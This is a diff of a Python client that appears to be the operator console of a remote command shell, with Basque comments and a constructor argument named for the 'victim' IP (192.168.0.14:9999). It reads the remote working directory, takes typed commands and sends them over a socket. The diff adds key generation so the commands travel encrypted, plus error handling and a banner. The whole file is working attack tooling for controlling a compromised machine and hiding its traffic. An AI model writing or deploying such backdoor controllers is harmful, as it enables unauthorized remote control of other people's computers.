@@ -2,7 +2,9 @@ import socket
 import time
 import zlib
 import pickle
+import os
 from fitxategiak.fitxa import bialketa
+from fitxategiak.asimetric import asime
 
 
 
@@ -10,13 +12,32 @@ from fitxategiak.fitxa import bialketa
 class cliente(object):
     def __init__(self,ip_biktima,portua):
         self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.so.connect((ip_biktima,portua))
+        try:
+            self.so.connect((ip_biktima,portua))
+        except ConnectionRefusedError:
+            print("none server...\n")
+        try:
+            os.mkdir("key")
+            self.GPG = asime("key")
+            self.GPG.creatinKEY(None,None)
+            print("""
+            #  $                  &&&&&&
+            # ##                 &&0000&&
+            ####################&&&0000&&&
+            ####################&&&0000&&&
+                                 &&0000&&
+                                  &&&&&& 
+            """)
+        except FileExistsError:
+            self.GPG = asime("key")
+    
+ 
 
     def comandLIne(self):
         recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
         url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
         mezua  = input(url + ">")
-        self.so.send(bytes(mezua,encoding = 'utf-8'))
+        self.so.send(bytes(self.GPG.encrypt(mezua),encoding = 'utf-8'))
         
     def koneksioa(self):
         while True:
@@ -64,9 +85,12 @@ class cliente(object):
         self.so.close()#koneksioa itxi 
 
 cliente = cliente("192.168.0.14",9999)
-print("kaixo")
-#cliente.koneksioa()
 while True:
-    cliente.comandLIne()
+    try:
+      cliente.comandLIne()
+    except OSError:
+      print("exit connecting...:")
+      break
+
 
 
